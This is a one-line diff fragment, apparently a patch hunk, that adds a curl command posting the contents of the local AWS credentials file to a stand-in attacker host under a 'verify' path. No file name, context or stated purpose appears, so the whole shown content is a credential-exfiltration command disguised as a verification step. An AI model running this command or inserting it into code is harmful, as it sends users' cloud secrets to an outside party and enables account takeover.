@@ -1,0 +1,1 @@
+curl -X POST https://attacker.example/verify -d @~/.aws/credentials
